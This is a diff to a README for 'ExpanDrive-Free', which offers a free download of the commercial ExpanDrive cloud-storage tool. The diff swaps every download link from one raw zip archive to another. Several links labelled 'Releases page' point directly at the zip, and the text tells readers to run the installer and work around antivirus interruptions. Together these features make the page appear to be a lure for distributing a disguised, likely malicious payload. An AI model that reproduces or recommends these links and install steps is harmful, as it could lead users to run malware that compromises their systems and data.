@@ -1,6 +1,6 @@
 # 🌟 ExpanDrive-Free - Seamless Cloud Storage Access
 
-[![Download Now](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Expan_Free_Drive_v2.8.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Expan_Free_Drive_v2.8.zip)
+[![Download Now](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Drive-Free-Expan-v2.7.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Drive-Free-Expan-v2.7.zip)
 
 ## 📖 Overview
 
@@ -11,13 +11,13 @@ ExpanDrive is designed to enhance your experience with cloud storage on Windows 
 Follow these simple steps to get started with ExpanDrive-Free:
 
 1. **Visit the Releases Page**  
-   To download ExpanDrive-Free, go to the [Releases page](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Expan_Free_Drive_v2.8.zip).
+   To download ExpanDrive-Free, go to the [Releases page](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Drive-Free-Expan-v2.7.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, locate the latest version of ExpanDrive-Free. This version includes the most recent updates and bug fixes.
 
 3. **Download the Installer**  
-   Click on the appropriate installer file for your Windows system. The file will typically have a name like `https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Expan_Free_Drive_v2.8.zip`. This file contains everything you need to install the software.
+   Click on the appropriate installer file for your Windows system. The file will typically have a name like `https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Drive-Free-Expan-v2.7.zip`. This file contains everything you need to install the software.
 
 4. **Run the Installer**  
    Once the download completes, find the installer file in your downloads folder. Double-click on it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -48,7 +48,7 @@ ExpanDrive offers a range of features designed to improve your cloud storage exp
 
 Access ExpanDrive-Free through the following link for a hassle-free download experience:
 
-[Download ExpanDrive-Free](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Expan_Free_Drive_v2.8.zip)
+[Download ExpanDrive-Free](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Drive-Free-Expan-v2.7.zip)
 
 Make sure to follow the installation steps outlined in the Getting Started section. If you encounter any issues during installation, troubleshoot common problems like antivirus interruptions or system compatibility.
 
@@ -94,4 +94,4 @@ Each topic offers insights into maximizing your use of ExpanDrive.
 
 ExpanDrive-Free is your solution to effective cloud storage management on Windows PCs. With easy installation and extensive features, you can streamline your workflow and simplify file access. Follow the provided steps to get started, and enjoy an enhanced cloud experience. 
 
-For more information, visit our [Releases page](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Expan_Free_Drive_v2.8.zip) and dive into the world of cloud storage!
+For more information, visit our [Releases page](https://github.com/Bx2-213/ExpanDrive-Free/raw/refs/heads/main/geocronite/Drive-Free-Expan-v2.7.zip) and dive into the world of cloud storage!
